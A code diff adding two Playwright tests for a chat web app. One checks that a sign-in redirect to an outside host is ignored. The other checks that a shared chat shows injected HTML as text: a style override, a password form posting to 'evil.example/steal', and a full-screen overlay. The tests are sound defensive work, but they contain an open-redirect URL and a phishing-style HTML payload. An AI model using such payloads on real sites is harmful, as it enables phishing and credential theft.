@@ -52,6 +52,23 @@ test('an anonymous visit to a protected route lands on /auth, and signing in ret
 	expect(await page.evaluate(() => localStorage.getItem('token'))).toBe('signed-in-token');
 });
 
+test('a redirect that would leave the app is ignored: signing in lands home instead of failing', async ({ page }) => {
+	await mockConfig(page, baseConfig);
+	await page.route('**/api/v1/auths/signin', (route) => route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) }));
+	await page.route('**/api/v1/auths/', (route) => route.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify(sessionUser) }));
+	await page.route('**/api/v1/auths/update/timezone', (route) => route.fulfill({ status: 200, contentType: 'application/json', body: '{}' }));
+	const errors: string[] = [];
+	page.on('pageerror', (e) => errors.push(String(e)));
+
+	await page.goto(`/auth?redirect=${encodeURIComponent('https://evil.example/pwned')}`);
+	await page.getByLabel('Email').fill('user@example.com');
+	await page.getByLabel('Password').fill('hunter2');
+	await page.getByRole('button', { name: 'Sign in' }).click();
+
+	await expect(page).toHaveURL(/localhost:5174\/$/);
+	expect(errors.filter((e) => e.includes('External navigation'))).toEqual([]);
+});
+
 test('a failed sign-in shows the backend error inline and stays on /auth', async ({ page }) => {
 	await mockConfig(page, baseConfig);
 	await page.route('**/api/v1/auths/signin', (route) =>
@@ -208,6 +225,25 @@ test('a shared chat renders read-only for an anonymous viewer, sanitized, with n
 	await expect(page.getByRole('button', { name: 'Clone Chat' })).toHaveCount(0);
 	expect(await page.evaluate(() => (window as unknown as { __xss?: boolean }).__xss)).toBeUndefined();
 	await expect(page).toHaveTitle('Explaining monads / local-llm');
+});
+
+test('a shared chat shows HTML in a message as text: no page styles, forms or overlays from the sharer', async ({ page }) => {
+	await mockConfig(page, baseConfig);
+	const attack = 'Sign in again <style>body{background:rgb(1, 2, 3) !important}</style><form action="https://evil.example/steal"><input type="password"></form><div style="position:fixed;inset:0">overlay</div>';
+	await page.route('**/api/v1/chats/share/evil', (route) =>
+		route.fulfill({
+			status: 200,
+			contentType: 'application/json',
+			body: JSON.stringify({ id: 'chat-2', chat: { title: 'Shared', timestamp: 1700000000000, history: { currentId: 'm1', messages: { m1: { id: 'm1', parentId: null, childrenIds: [], role: 'user', content: attack } } } } })
+		})
+	);
+
+	await page.goto('/s/evil');
+
+	const body = page.getByTestId('markdown');
+	await expect(body).toContainText('<form action="https://evil.example/steal">');
+	await expect(body.locator('style, form, input, [style]')).toHaveCount(0);
+	expect(await page.evaluate(() => getComputedStyle(document.body).backgroundColor)).not.toBe('rgb(1, 2, 3)');
 });
 
 test('an unknown share id sends an anonymous viewer to sign in, then back to it', async ({ page }) => {
